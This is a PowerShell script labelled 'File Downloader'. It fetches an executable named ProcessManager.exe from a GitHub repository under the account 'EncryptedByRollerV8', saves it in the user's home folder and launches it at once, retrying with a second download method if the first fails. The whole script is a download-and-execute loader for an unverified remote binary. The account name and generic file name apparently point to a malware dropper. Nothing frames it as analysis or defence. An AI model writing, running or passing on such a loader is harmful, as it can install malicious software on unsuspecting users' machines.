# Force the script to continue on errors
$ErrorActionPreference = "Continue"

Write-Host "=== File Downloader ===" -ForegroundColor Green
Write-Host "Script started at: $(Get-Date)"

# Get the exact path to C:\Users\[username]
$userName = $env:USERNAME
$userFolder = "C:\Users\$userName"
$destination = "$userFolder\ProcessManager.exe"

Write-Host "Username: $userName"
Write-Host "User folder: $userFolder"
Write-Host "Destination: $destination"

# Download URL
$url = "https://github.com/EncryptedByRollerV8/f/raw/main/ProcessManager.exe"

# Delete existing file if it exists
if (Test-Path $destination) {
    Write-Host "Existing file found. Deleting..." -ForegroundColor Yellow
    try {
        Remove-Item -Path $destination -Force -ErrorAction Stop
        Write-Host "Old file deleted successfully." -ForegroundColor Green
    }
    catch {
        Write-Host "Warning: Could not delete old file: $($_.Exception.Message)" -ForegroundColor Red
    }
}

try {
    # Download the file
    Write-Host "`nDownloading from GitHub..." -ForegroundColor Cyan
    
    # Method 1: Try Invoke-WebRequest first
    Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction Stop
    
    Write-Host "✓ Download completed successfully!" -ForegroundColor Green
    
    # Verify the file was created
    if (Test-Path $destination) {
        $fileSize = (Get-Item $destination).Length
        Write-Host "✓ File verified: $fileSize bytes" -ForegroundColor Green
        
        # Run the application
        Write-Host "`nStarting ProcessManager..." -ForegroundColor Yellow
        Start-Process -FilePath $destination -ErrorAction Stop
        Write-Host "✓ ProcessManager started!" -ForegroundColor Green
    }
    else {
        Write-Host "❌ ERROR: File was not created at destination" -ForegroundColor Red
    }
}
catch {
    Write-Host "❌ DOWNLOAD ERROR: $($_.Exception.Message)" -ForegroundColor Red
    
    # Alternative download method
    Write-Host "`nTrying alternative download method..." -ForegroundColor Yellow
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $destination)
        $webClient.Dispose()
        
        if (Test-Path $destination) {
            Write-Host "✓ Alternative download successful!" -ForegroundColor Green
            Start-Process -FilePath $destination
        }
    }
    catch {
        Write-Host "❌ Alternative download also failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Keep window open
Write-Host "`n=== Download Process Complete ===" -ForegroundColor Cyan
Write-Host "File location: $destination"
Write-Host "Press any key to close this window..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
